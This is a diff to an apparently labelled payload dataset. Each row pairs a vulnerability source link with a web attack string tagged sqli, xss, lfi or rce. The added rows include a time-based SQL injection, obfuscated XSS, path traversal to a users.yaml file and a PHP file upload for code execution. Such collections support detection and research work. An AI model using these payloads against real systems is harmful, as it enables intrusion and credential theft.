@@ -479,3 +479,8 @@ https://fares7elsadek.medium.com/my-first-bug-how-i-was-able-to-bypass-the-waf-a
 https://vulners.com/github/GHSA-8XHR-X3V8-RGHJ?utm_source=rss&utm_medium=rss&utm_campaign=rss,"services.logging.getLogger(""foo"").error(""Job content executed"")",rce
 https://vulners.com/cve/CVE-2023-41044?utm_source=rss&utm_medium=rss&utm_campaign=rss,/api/system/debug/support/bundle/download/{filename},lfi
 https://t.me/ZerodayExploitware/2233,<SvG><set%0Aonbegin%0A=%0aa=confirm;a%28%60xss%60)/x>,xss
+https://vulners.com/cve/CVE-2023-31719?utm_source=rss&utm_medium=rss&utm_campaign=rss,test' OR 2891=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2))))-- ZJMj,sqli
+https://twitter.com/jacky_ichwan/status/1721054490017886381,javascript:var a="ale";var b="rt";var c="()";decodeURI("&lt;button popovertarget=x&gt;Click me&lt;/button&gt;&lt;hvita onbeforetoggle="+a+b+c+" popover id=x&gt;Hvita&lt;/hvita&gt;"),xss
+https://www.linkedin.com/pulse/yamcs-vulnerability-assessment-visionspace-technologies/,/api/storage/buckets/displays/objects/../../../../../../../../home/kali/work/assessments/yamcs/examples/simulation/target/yamcs/etc/users.yaml,lfi
+https://github.com/crater-invoice/crater/issues/1267,{"name":"test.php","data":"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAIAAAD8GO2jAAAAVklEQVR4nGNcPD89JF9HRVRbMF0oJF9QT1NUWzFdKTs/PljAc143k/yPi9t+X9N9qif38ePJv1/vBnyyMFiXHMwwCkbBKBgFo2AUjIJRMApGwSgYfgAAI0oXArodV7QAAAAASUVORK5CYII="},rce
+
